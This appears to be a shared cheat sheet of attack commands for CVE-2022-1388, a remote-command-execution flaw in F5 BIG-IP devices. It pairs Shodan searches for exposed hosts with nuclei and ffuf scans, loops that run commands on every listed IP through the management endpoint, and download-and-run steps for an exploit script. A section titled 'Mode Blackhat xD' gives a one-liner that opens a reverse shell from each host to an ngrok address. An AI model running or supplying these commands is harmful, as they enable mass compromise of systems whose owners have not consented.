To find this vulnerability use below command

cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" [http://$ip/mgmt/tm/util/bash](http://$ip/mgmt/tm/util/bash) -d '{"command":"run","utilCmdArgs":"-c id"}';done

Also below is the procedure to reproduce this vuln.

[https://lnkd.in/e8EtuWCE](https://lnkd.in/e8EtuWCE)

[https://lnkd.in/e2pqEj9V](https://lnkd.in/e2pqEj9V)

https://github.com/alt3kx/CVE-2022-1388_PoC

shodan init portuAPIctmxd

shodan search 'http.title:BIG-IP&reg:-Redirect' --fields ip_str --separator " " | awk '{print $1}' | cat > url.txt

cat url.txt | httpx | nuclei -t nuclei-templates/cves/2022/CVE-2022-1388.yaml

cat url.txt | httpx | nuclei -t CVE-2022-1388.yaml

- -------------------------Scanning SH--------------------------

shodan search 'http.title:BIG-IP&reg:-Redirect' --fields ip_str --separator " " | awk '{print $1}' | cat > url.txt

wget [https://lnkd.in/eYk4UVmm](https://lnkd.in/eYk4UVmm)

chmod +x [CVE-2022-1388.sh](http://cve-2022-1388.sh/)

./[CVE-2022-1388.sh](http://cve-2022-1388.sh/) url.txt

- -------------------------Mode Blackhat xD------------------------

Reverse shell all host ;)

cat url.txt | while read ip; do curl -sk --max-time 2 -H "Content-Type: 
application/json" "https://$ip/mgmt/tm/util/bash" -d 
'{"command":"run","utilCmdArgs":"-c 'exec bash -i &>/dev/tcp/[0.tcp.ngrok.io/14717](http://0.tcp.ngrok.io/14717)<&1'"}';done

- -------------------------Search manual------------------------

Shodan:

[https://lnkd.in/ehMFp-bn](https://lnkd.in/ehMFp-bn)

Censys:

[https://lnkd.in/e6wEN8wj](https://lnkd.in/e6wEN8wj)

Exploit:

[https://lnkd.in/dy4UjxJF](https://lnkd.in/dy4UjxJF)

[https://lnkd.in/d42HgMy7](https://lnkd.in/d42HgMy7)

[https://lnkd.in/dErTnRd3](https://lnkd.in/dErTnRd3)

GTFOBins Reverse Shell

[https://lnkd.in/dr5sS8tF](https://lnkd.in/dr5sS8tF)

Using shodan with nuclei

shodan search --limit 1000 'http.title:"BIG-IP®-+Redirect" +"Server"' | awk '{print $1,":"$2}' | sed 's/ //' | httpx -silent | nuclei -t ~/nuclei-templates/cves/2022/CVE-2022-1388.yaml

CVE-2022-1388 PoC
ffuf -w bigip-target-list.txt -u [https://FUZZ//mgmt/tm/util/bash](https://fuzz//mgmt/tm/util/bash) -X POST -H "Connection: keep-alive, X-F5-Auth-Token" -H "X-F5-Auth-Token: a" -d '{"command":"run","utilCmdArgs":"-c id"}' -mr "root"

httpx -l ListIP -match-string "resterrorresponse" -threads 9500 -paths /mgmt/shared/authn/login -follow-redirects

Here is another simple command using nuclei to scan urls.txt for BIG-IP CVE.

nuclei -l httprobe_sub_findomains.txt -id CVE-2022-1388 -vv
